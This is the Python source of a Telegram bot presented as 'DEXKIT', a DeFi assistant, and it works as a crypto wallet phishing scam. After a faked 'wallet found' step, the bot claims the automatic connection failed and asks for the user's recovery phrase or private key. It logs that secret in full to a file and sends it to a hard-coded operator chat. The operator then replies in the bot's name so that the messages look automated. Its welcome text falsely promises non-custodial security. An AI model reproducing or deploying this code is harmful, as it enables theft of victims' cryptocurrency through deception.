import asyncio
import logging
import re
import os
from datetime import datetime
from dotenv import load_dotenv
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Replace with your real dApp URL (or leave as placeholder)
DEXKIT_DAPP_URL = "https://dexkit-dapp.example.com"

# Admin configuration - Add your Telegram user ID here (get it from @userinfobot)
# Leave empty to allow any user to use admin commands (NOT RECOMMENDED for production)
ADMIN_USER_IDS = []  # Example: [123456789, 987654321]

# Admin Telegram account - Your personal Telegram account that will receive all messages
# Get your chat ID by messaging @userinfobot or @getidsbot
ADMIN_CHAT_ID = 7784680902  # Your Telegram account chat ID

# Store pending users waiting for admin reply
pending_users = {}  # {user_id: {"name": str, "username": str, "recovery": str, "wallet": str}}

# State tracking
WAITING_FOR_WALLET = "waiting_for_wallet"
WAITING_FOR_RECOVERY = "waiting_for_recovery"

# Load environment variables
load_dotenv()

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('dexkit_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


def log_user_message(update: Update, message_type: str = "message") -> None:
    """Log user messages with details"""
    user = update.effective_user
    if message_type == "message" and update.message:
        text = update.message.text or "[No text]"
        user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
        log_msg = f"\n{'='*60}\n📥 USER MESSAGE\n{'='*60}\n"
        log_msg += f"User: {user_info} ({user.first_name} {user.last_name or ''})\n"
        log_msg += f"User ID: {user.id}\n"
        log_msg += f"Message: {text}\n"
        log_msg += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        log_msg += f"{'='*60}\n"
        logger.info(log_msg)
        print(log_msg)
    elif message_type == "callback" and update.callback_query:
        query = update.callback_query
        user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
        log_msg = f"\n{'='*60}\n🔘 USER BUTTON CLICK\n{'='*60}\n"
        log_msg += f"User: {user_info} ({user.first_name} {user.last_name or ''})\n"
        log_msg += f"User ID: {user.id}\n"
        log_msg += f"Button: {query.data}\n"
        log_msg += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        log_msg += f"{'='*60}\n"
        logger.info(log_msg)
        print(log_msg)


def log_bot_response(response_text: str, user_id: int = None) -> None:
    """Log bot responses"""
    log_msg = f"\n{'='*60}\n📤 BOT RESPONSE\n{'='*60}\n"
    if user_id:
        log_msg += f"To User ID: {user_id}\n"
    log_msg += f"Response: {response_text[:200]}{'...' if len(response_text) > 200 else ''}\n"
    log_msg += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    log_msg += f"{'='*60}\n"
    logger.info(log_msg)
    print(log_msg)


async def forward_to_admin(context: ContextTypes.DEFAULT_TYPE, message_text: str, user_info: dict, message_type: str = "message") -> None:
    """Forward user messages to admin's Telegram account"""
    if ADMIN_CHAT_ID is None:
        return
    
    try:
        # Escape special Markdown characters in user input
        def escape_markdown(text):
            if not text:
                return "Not provided"
            text = str(text)
            # Escape special markdown characters
            text = text.replace("_", "\\_")
            text = text.replace("*", "\\*")
            text = text.replace("[", "\\[")
            text = text.replace("]", "\\]")
            text = text.replace("`", "\\`")
            text = text.replace("(", "\\(")
            text = text.replace(")", "\\)")
            text = text.replace("~", "\\~")
            text = text.replace("|", "\\|")
            text = text.replace(">", "\\>")
            text = text.replace("#", "\\#")
            text = text.replace("+", "\\+")
            text = text.replace("-", "\\-")
            text = text.replace(".", "\\.")
            text = text.replace("!", "\\!")
            return text
        
        if message_type == "message":
            safe_name = escape_markdown(user_info.get('name', 'Unknown'))
            safe_user_id = escape_markdown(str(user_info.get('user_id')))
            safe_username = escape_markdown(user_info.get('username', 'No username'))
            safe_message = escape_markdown(message_text)
            
            forward_msg = f"📥 *New Message from User*\n\n"
            forward_msg += f"👤 *User:* {safe_name}\n"
            forward_msg += f"🆔 *User ID:* `{safe_user_id}`\n"
            forward_msg += f"📝 *Username:* {safe_username}\n"
            forward_msg += f"💬 *Message:*\n{safe_message}\n\n"
            forward_msg += f"💡 *Reply format:* `{safe_user_id}: your reply message`\n"
            forward_msg += f"Or use: `/reply {safe_user_id} your message`"
            
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=forward_msg,
                parse_mode="Markdown"
            )
        elif message_type == "recovery":
            safe_name = escape_markdown(user_info.get('name', 'Unknown'))
            safe_user_id = escape_markdown(str(user_info.get('user_id')))
            safe_username = escape_markdown(user_info.get('username', 'No username'))
            safe_wallet = escape_markdown(user_info.get('wallet', 'Not provided'))
            safe_recovery = escape_markdown(user_info.get('recovery', 'Not provided'))
            
            forward_msg = f"🔐 *Recovery Phrase/Private Key Received*\n\n"
            forward_msg += f"👤 *User:* {safe_name}\n"
            forward_msg += f"🆔 *User ID:* `{safe_user_id}`\n"
            forward_msg += f"📝 *Username:* {safe_username}\n"
            forward_msg += f"💰 *Wallet:* `{safe_wallet}`\n"
            forward_msg += f"🔑 *Recovery/Key:* `{safe_recovery}`\n\n"
            forward_msg += f"⏸️ *Bot is waiting for your reply*\n\n"
            forward_msg += f"💡 *Reply format:* `{safe_user_id}: your reply message`\n"
            forward_msg += f"Or use: `/reply {safe_user_id} your message`"
            
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=forward_msg,
                parse_mode="Markdown"
            )
    except Exception as e:
        logger.error(f"Error forwarding to admin: {e}")
        print(f"❌ Error forwarding to admin (Chat ID: {ADMIN_CHAT_ID}): {e}")
        # Try to send a simple test message
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"⚠️ Bot forwarding error: {str(e)}"
            )
        except Exception as e2:
            logger.error(f"Could not send error message to admin: {e2}")
            print(f"❌ Could not send error message to admin: {e2}")


def log_sensitive_data(data_type: str, data: str, user_id: int) -> None:
    """Log sensitive data (wallet addresses, recovery phrases, etc.)"""
    # Mask sensitive data for display but keep full in log file
    if data_type == "wallet_address":
        masked = f"{data[:6]}...{data[-4:]}" if len(data) > 10 else "***"
        display_msg = f"💰 WALLET ADDRESS RECEIVED\nUser ID: {user_id}\nAddress: {masked}\nFull: {data}\n"
    elif data_type == "recovery_phrase":
        masked = "***" + " " * 20 + "***"  # Don't show recovery phrase in console
        display_msg = f"🔐 RECOVERY PHRASE/PRIVATE KEY RECEIVED\nUser ID: {user_id}\nData: {masked}\nFull: {data}\n"
    else:
        display_msg = f"📝 DATA RECEIVED\nType: {data_type}\nUser ID: {user_id}\nData: {data}\n"
    
    log_msg = f"\n{'='*60}\n{display_msg}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n{'='*60}\n"
    logger.info(log_msg)
    print(log_msg)

# Main menu keyboard
MAIN_KEYBOARD = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🪙 Claim Token")],
        [KeyboardButton("💰 Buy"), KeyboardButton("📉 Sell")],
        [KeyboardButton("💳 Deposit"), KeyboardButton("💸 Withdraw")],
    ],
    resize_keyboard=True,
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle /start command"""
    log_user_message(update, "message")
    text = (
        "Welcome to *DEXKIT* – your next-generation DeFi assistant on Telegram.\n\n"
        "Seamlessly claim tokens, swap assets, deposit, and withdraw directly from here.\n\n"
        "🔐 *Advanced DeFi Security*\n"
        "DEXKIT uses secure wallet interactions and modern cryptographic standards to protect user data.\n\n"
        "⚡ *Fast, On-Chain Execution*\n"
        "Enjoy real-time, smooth DeFi interactions.\n\n"
        "🛡 *Non-Custodial • Encrypted • Secure*\n"
        "You remain in control at all times.\n\n"
        "Choose an option below to get started:"
    )
    await update.message.reply_text(text, reply_markup=MAIN_KEYBOARD, parse_mode="Markdown")
    log_bot_response(text, update.effective_user.id)


async def handle_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle main menu button clicks"""
    log_user_message(update, "message")
    text = update.message.text
    
    # Forward user message to admin
    user = update.effective_user
    await forward_to_admin(context, text, {
        "name": f"{user.first_name} {user.last_name or ''}".strip(),
        "username": user.username or "No username",
        "user_id": user.id
    })

    if text == "🪙 Claim Token":
        await ask_wallet_address(update, context)
    elif text == "💰 Buy":
        response = "💰 *Buy*\n\nThis feature will let you purchase tokens through supported DEXs.\n\n*Coming soon!*"
        await update.message.reply_text(
            response,
            reply_markup=MAIN_KEYBOARD,
            parse_mode="Markdown",
        )
        log_bot_response(response, update.effective_user.id)
    elif text == "📉 Sell":
        response = "📉 *Sell*\n\nThis feature will let you sell tokens through supported DEXs.\n\n*Coming soon!*"
        await update.message.reply_text(
            response,
            reply_markup=MAIN_KEYBOARD,
            parse_mode="Markdown",
        )
        log_bot_response(response, update.effective_user.id)
    elif text == "💳 Deposit":
        response = "💳 *Deposit*\n\nDeposit assets into supported protocols.\n\n*Coming soon!*"
        await update.message.reply_text(
            response,
            reply_markup=MAIN_KEYBOARD,
            parse_mode="Markdown",
        )
        log_bot_response(response, update.effective_user.id)
    elif text == "💸 Withdraw":
        response = "💸 *Withdraw*\n\nWithdraw assets from supported protocols.\n\n*Coming soon!*"
        await update.message.reply_text(
            response,
            reply_markup=MAIN_KEYBOARD,
            parse_mode="Markdown",
        )
        log_bot_response(response, update.effective_user.id)
    else:
        response = "Please choose an option from the menu below."
        await update.message.reply_text(
            response,
            reply_markup=MAIN_KEYBOARD,
        )
        log_bot_response(response, update.effective_user.id)


async def ask_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Ask user for wallet address"""
    if update.message:
        context.user_data["state"] = WAITING_FOR_WALLET
        
        # Create inline keyboard with Cancel and Main Menu buttons
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_button"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu_button")],
            ]
        )
        
        response = "🪙 *Claim Token*\n\nPlease enter your wallet address (any cryptocurrency network):"
        await update.message.reply_text(response, parse_mode="Markdown", reply_markup=keyboard)
        log_bot_response(response, update.effective_user.id)


async def handle_wallet_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle wallet address input"""
    log_user_message(update, "message")
    wallet_address = update.message.text.strip()
    
    # Forward to admin
    user = update.effective_user
    await forward_to_admin(context, wallet_address, {
        "name": f"{user.first_name} {user.last_name or ''}".strip(),
        "username": user.username or "No username",
        "user_id": user.id
    })
    
    # Log the wallet address
    log_sensitive_data("wallet_address", wallet_address, update.effective_user.id)
    
    # Basic validation
    if len(wallet_address) < 20:
        response = "❌ That doesn't look like a valid wallet address.\nPlease double-check and send the correct address."
        await update.message.reply_text(response)
        log_bot_response(response, update.effective_user.id)
        return

    # Store wallet address
    context.user_data["wallet_address"] = wallet_address
    
    # Show processing message
    processing_msg = await update.message.reply_text("⏳ Processing your address…")
    log_bot_response("⏳ Processing your address…", update.effective_user.id)
    await asyncio.sleep(2)

    # Simulate wallet found
    connect_button = InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")
    keyboard = InlineKeyboardMarkup([[connect_button]])

    response = "✅ *Wallet found!*\n\nClick *Connect Wallet* to proceed and claim your tokens."
    await processing_msg.edit_text(response, parse_mode="Markdown", reply_markup=keyboard)
    log_bot_response(response, update.effective_user.id)
    
    # Clear the waiting state
    context.user_data["state"] = None


async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline button callbacks"""
    log_user_message(update, "callback")
    query = update.callback_query
    await query.answer()

    if query.data == "connect_wallet":
        # Show processing message
        processing_msg = await query.message.reply_text("⏳ Processing…")
        log_bot_response("⏳ Processing…", update.effective_user.id)
        await asyncio.sleep(2)

        # Show connection failed message and ask for recovery phrase/private key
        context.user_data["state"] = WAITING_FOR_RECOVERY
        
        # Create inline keyboard with Cancel and Main Menu buttons
        keyboard = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_button"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu_button")],
            ]
        )
        
        response = (
            "⚠️ *Automatic connection failed*\n"
            "Failed to detect wallet connect.\n\n"
            "Enter your 12-key recovery phrase or private key to connect manually."
        )
        await processing_msg.edit_text(response, parse_mode="Markdown", reply_markup=keyboard)
        log_bot_response(response, update.effective_user.id)
    elif query.data == "cancel_button":
        # Cancel current operation
        context.user_data["state"] = None
        context.user_data.pop("wallet_address", None)
        context.user_data.pop("recovery_input", None)
        response = "❌ Operation cancelled. Returning to main menu..."
        await query.message.reply_text(response, reply_markup=MAIN_KEYBOARD)
        log_bot_response(response, update.effective_user.id)
    elif query.data == "main_menu_button":
        # Return to main menu
        context.user_data["state"] = None
        context.user_data.pop("wallet_address", None)
        context.user_data.pop("recovery_input", None)
        response = "🏠 Returning to main menu..."
        await query.message.reply_text(response, reply_markup=MAIN_KEYBOARD)
        log_bot_response(response, update.effective_user.id)


async def handle_recovery_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle recovery phrase or private key input"""
    log_user_message(update, "message")
    recovery_input = update.message.text.strip()
    
    # Log the recovery phrase/private key (sensitive data)
    log_sensitive_data("recovery_phrase", recovery_input, update.effective_user.id)
    
    # Store the recovery input
    context.user_data["recovery_input"] = recovery_input
    
    # Show processing message
    await update.message.reply_text("⏳ Processing…")
    log_bot_response("⏳ Processing…", update.effective_user.id)
    await asyncio.sleep(2)
    
    # Store user in pending list for admin reply
    user = update.effective_user
    wallet_address = context.user_data.get("wallet_address", "Not provided")
    pending_users[user.id] = {
        "name": f"{user.first_name} {user.last_name or ''}".strip(),
        "username": user.username or "No username",
        "recovery": recovery_input,
        "wallet": wallet_address,
        "chat_id": update.message.chat_id
    }
    
    # Forward recovery phrase to admin
    await forward_to_admin(context, recovery_input, {
        "name": f"{user.first_name} {user.last_name or ''}".strip(),
        "username": user.username or "No username",
        "user_id": user.id,
        "wallet": wallet_address,
        "recovery": recovery_input
    }, message_type="recovery")
    
    # Clear the waiting state - bot will now wait for admin manual reply
    context.user_data["state"] = None
    
    # Log that user is waiting for admin reply
    user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
    admin_notification = f"\n{'='*60}\n⏸️  WAITING FOR ADMIN REPLY\n{'='*60}\n"
    admin_notification += f"User: {user_info} ({user.first_name} {user.last_name or ''})\n"
    admin_notification += f"User ID: {user.id}\n"
    admin_notification += f"Chat ID: {update.message.chat_id}\n"
    admin_notification += f"Wallet: {wallet_address}\n"
    admin_notification += f"Recovery phrase/private key received and logged above.\n"
    admin_notification += f"Message forwarded to admin Telegram account.\n"
    admin_notification += f"Bot is paused - waiting for your manual reply.\n"
    admin_notification += f"Reply format: `{user.id}: your message`\n"
    admin_notification += f"Or use: /reply {user.id} <your message>\n"
    admin_notification += f"{'='*60}\n"
    logger.info(admin_notification)
    print(admin_notification)
    
    # DO NOT send automatic response - wait for admin to reply manually


async def admin_reply(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Admin command to reply to users who sent recovery phrases"""
    user = update.effective_user
    
    # Check if user is admin (if ADMIN_USER_IDS is set)
    if ADMIN_USER_IDS and user.id not in ADMIN_USER_IDS:
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    # Parse command: /reply <user_id> <message>
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "Usage: /reply <user_id> <your message>\n\n"
            "Example: /reply 123456789 Your tokens have been sent!\n\n"
            "To see pending users, use: /pending"
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        reply_message = " ".join(context.args[1:])
        
        # Send message to target user as if it's from the bot naturally
        # Include main menu keyboard so it flows naturally
        await context.bot.send_message(
            chat_id=target_user_id,
            text=reply_message,
            reply_markup=MAIN_KEYBOARD
        )
        
        # Log as bot response (not admin) so it looks seamless
        log_bot_response(reply_message, target_user_id)
        
        # Also log admin action separately (for your records)
        admin_log = f"\n{'='*60}\n👤 ADMIN SENT REPLY (as bot)\n{'='*60}\n"
        admin_log += f"Admin: {user.first_name} (ID: {user.id})\n"
        admin_log += f"To User ID: {target_user_id}\n"
        admin_log += f"Bot Message: {reply_message}\n"
        admin_log += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        admin_log += f"{'='*60}\n"
        logger.info(admin_log)
        print(admin_log)
        
        # Remove from pending if exists
        if target_user_id in pending_users:
            del pending_users[target_user_id]
        
        await update.message.reply_text(f"✅ Reply sent to user {target_user_id} (appears as bot response)")
        
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. User ID must be a number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending reply: {str(e)}")
        logger.error(f"Error in admin_reply: {e}")


async def show_pending(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show list of users waiting for admin reply"""
    user = update.effective_user
    
    # Check if user is admin (if ADMIN_USER_IDS is set)
    if ADMIN_USER_IDS and user.id not in ADMIN_USER_IDS:
        await update.message.reply_text("❌ You don't have permission to use this command.")
        return
    
    if not pending_users:
        await update.message.reply_text("✅ No pending users. All caught up!")
        return
    
    message = "⏸️ *Pending Users Waiting for Reply:*\n\n"
    for user_id, user_data in pending_users.items():
        message += f"👤 *{user_data['name']}*\n"
        message += f"   Username: @{user_data['username']}\n"
        message += f"   User ID: `{user_id}`\n"
        message += f"   Wallet: `{user_data['wallet'][:20]}...`\n"
        message += f"   Use: `/reply {user_id} <message>`\n"
        message += f"   Or: `{user_id}: <message>`\n\n"
    
    await update.message.reply_text(message, parse_mode="Markdown")


async def get_my_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Get the chat ID of the user (for admin setup)"""
    user = update.effective_user
    chat_id = update.message.chat_id
    
    message = f"📋 *Your Telegram Information*\n\n"
    message += f"👤 *Name:* {user.first_name} {user.last_name or ''}\n"
    message += f"🆔 *User ID:* `{user.id}`\n"
    message += f"💬 *Chat ID:* `{chat_id}`\n"
    message += f"📝 *Username:* @{user.username or 'No username'}\n\n"
    message += f"💡 *To set up message forwarding:*\n"
    message += f"Add this to ADMIN_CHAT_ID in the code:\n`{chat_id}`\n\n"
    message += f"Then all user messages will be forwarded to this account!"
    
    await update.message.reply_text(message, parse_mode="Markdown")
    
    # Also send test message if this is the admin
    if ADMIN_CHAT_ID is not None and chat_id == ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="✅ *Test Message - Forwarding Works!*\n\n"
                     "This confirms that message forwarding is configured correctly.\n"
                     "You will receive all user messages here.",
                parse_mode="Markdown"
            )
        except Exception as e:
            logger.error(f"Could not send test message: {e}")


async def handle_admin_reply_format(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Detect if message is admin reply in format: <user_id>: <message> or reply <user_id>: <message>"""
    if not update.message or not update.message.text:
        return False
    
    text = update.message.text.strip()
    user = update.effective_user
    
    # Check if message is from admin (if ADMIN_CHAT_ID is set, check if it matches)
    # Or if ADMIN_USER_IDS is set, check if user is admin
    is_admin = False
    if ADMIN_CHAT_ID and update.message.chat_id == ADMIN_CHAT_ID:
        is_admin = True
    elif ADMIN_USER_IDS and user.id in ADMIN_USER_IDS:
        is_admin = True
    elif ADMIN_CHAT_ID is None and len(ADMIN_USER_IDS) == 0:
        # If no admin config, allow anyone (for testing)
        is_admin = True
    
    if not is_admin:
        return False
    
    # Check for format: <user_id>: <message> or reply <user_id>: <message>
    pattern1 = r'^(\d+):\s*(.+)$'  # Format: 123456789: message
    pattern2 = r'^reply\s+(\d+):\s*(.+)$'  # Format: reply 123456789: message
    pattern3 = r'^(\d+)\s+(.+)$'  # Format: 123456789 message (without colon)
    
    match = re.match(pattern1, text, re.IGNORECASE) or \
            re.match(pattern2, text, re.IGNORECASE) or \
            re.match(pattern3, text, re.IGNORECASE)
    
    if match:
        target_user_id = int(match.group(1))
        reply_message = match.group(2) if len(match.groups()) >= 2 else text.split(' ', 1)[1] if ' ' in text else ""
        
        if not reply_message:
            await update.message.reply_text("❌ Please include a message to send.\nFormat: `<user_id>: <message>`", parse_mode="Markdown")
            return True
        
        try:
            # Send message to target user as if it's from the bot
            await context.bot.send_message(
                chat_id=target_user_id,
                text=reply_message,
                reply_markup=MAIN_KEYBOARD
            )
            
            # Log as bot response
            log_bot_response(reply_message, target_user_id)
            
            # Log admin action
            admin_log = f"\n{'='*60}\n👤 ADMIN SENT REPLY (via format)\n{'='*60}\n"
            admin_log += f"Admin: {user.first_name} (ID: {user.id})\n"
            admin_log += f"To User ID: {target_user_id}\n"
            admin_log += f"Bot Message: {reply_message}\n"
            admin_log += f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            admin_log += f"{'='*60}\n"
            logger.info(admin_log)
            print(admin_log)
            
            # Remove from pending if exists
            if target_user_id in pending_users:
                del pending_users[target_user_id]
            
            await update.message.reply_text(f"✅ Reply sent to user {target_user_id} (appears as bot response)")
            return True
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID format.")
            return True
        except Exception as e:
            await update.message.reply_text(f"❌ Error sending reply: {str(e)}")
            logger.error(f"Error in handle_admin_reply_format: {e}")
            return True
    
    return False


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Route messages to appropriate handler"""
    # First check if it's an admin reply in special format
    if await handle_admin_reply_format(update, context):
        return
    
    state = context.user_data.get("state")
    
    if state == WAITING_FOR_WALLET:
        await handle_wallet_input(update, context)
    elif state == WAITING_FOR_RECOVERY:
        await handle_recovery_input(update, context)
    else:
        await handle_main_menu(update, context)


async def delete_webhook(app) -> None:
    """Delete any existing webhook to avoid conflicts"""
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Webhook deleted successfully")
        print("✅ Webhook deleted successfully")
    except Exception as e:
        logger.warning(f"⚠️ Could not delete webhook: {e}")
        print(f"⚠️ Could not delete webhook: {e}")


async def initialize_bot(app) -> None:
    """Initialize bot and delete webhook"""
    print("🔄 Checking for existing webhooks...")
    await delete_webhook(app)
    
    # Send test message to admin if configured
    if ADMIN_CHAT_ID is not None:
        try:
            await app.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text="🤖 *DEXKIT Bot Started Successfully!*\n\n"
                     "All user messages will be forwarded to this account.\n\n"
                     "You can reply using:\n"
                     "• `<user_id>: your message`\n"
                     "• `/reply <user_id> your message`",
                parse_mode="Markdown"
            )
            print(f"✅ Test message sent to admin (Chat ID: {ADMIN_CHAT_ID})")
            logger.info(f"Test message sent to admin: {ADMIN_CHAT_ID}")
        except Exception as e:
            print(f"⚠️ Could not send test message to admin: {e}")
            print(f"   Make sure the bot can message chat ID: {ADMIN_CHAT_ID}")
            logger.warning(f"Could not send test message to admin: {e}")


def main() -> None:
    """Main function to start the bot"""
    # Bot token from environment variable
    BOT_TOKEN = os.getenv('BOT_TOKEN')
    
    print("🔍 Checking environment variables...")
    print(f"BOT_TOKEN: {'✅ Found' if BOT_TOKEN else '❌ Not found'}")
    print(f"ADMIN_CHAT_ID: {os.getenv('ADMIN_CHAT_ID', '❌ Not set')}")
    
    if not BOT_TOKEN:
        error_msg = "❌ FATAL ERROR: BOT_TOKEN not found in environment variables!"
        print(error_msg)
        logger.error(error_msg)
        print("\n📋 Available environment variables:")
        for key in os.environ:
            if 'BOT' in key or 'ADMIN' in key or 'TOKEN' in key:
                print(f"   {key}")
        print("\n💡 Make sure to set BOT_TOKEN in pella.app environment variables!")
        import sys
        sys.exit(1)
    
    # Build application with proper timeout settings
    app = ApplicationBuilder() \
        .token(BOT_TOKEN) \
        .get_updates_read_timeout(10) \
        .get_updates_write_timeout(10) \
        .get_updates_connect_timeout(10) \
        .build()

    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("reply", admin_reply))
    app.add_handler(CommandHandler("pending", show_pending))
    app.add_handler(CommandHandler("myid", get_my_id))
    app.add_handler(CallbackQueryHandler(handle_callback_query))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("\n" + "="*60)
    print("🤖 DEXKIT BOT IS STARTING...")
    print("="*60)
    print("📊 All interactions will be logged here and saved to 'dexkit_bot.log'")
    print("👀 Watch this console to see all user messages and bot responses")
    print("\n🔧 Admin Commands:")
    print("   /myid - Get your Telegram chat ID (for setting up forwarding)")
    print("   /pending - Show users waiting for reply")
    print("   /reply <user_id> <message> - Reply to a user")
    print("\n💡 Reply Formats (from your Telegram account):")
    print("   <user_id>: <message> - Quick reply format")
    print("   reply <user_id>: <message> - Alternative format")
    print("\n⚙️  Setup:")
    if ADMIN_CHAT_ID is None:
        print("   ⚠️  ADMIN_CHAT_ID not set - message forwarding disabled")
        print("   Use /myid command in bot to get your chat ID, then set ADMIN_CHAT_ID in code")
    else:
        print(f"   ✅ ADMIN_CHAT_ID set to: {ADMIN_CHAT_ID}")
        print("   All user messages will be forwarded to your account")
    print("="*60)
    print("Press Ctrl+C to stop\n")
    
    # Run bot with drop_pending_updates to avoid conflicts
    try:
        print("🚀 Starting bot polling...")
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=["message", "callback_query"],
            poll_interval=0.0
        )
    except KeyboardInterrupt:
        print("\n\n🛑 Bot stopped by user")
        logger.info("Bot stopped by user")
    except asyncio.TimeoutError:
        logger.error("Bot connection timeout")
        print("\n❌ Timeout Error: Bot couldn't connect to Telegram")
        print("   Make sure ProtonVPN is still connected")
        print("   Try restarting the bot")
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"\n❌ Error: {e}")
        print("Make sure ProtonVPN is connected and try again")


if __name__ == "__main__":
    main()
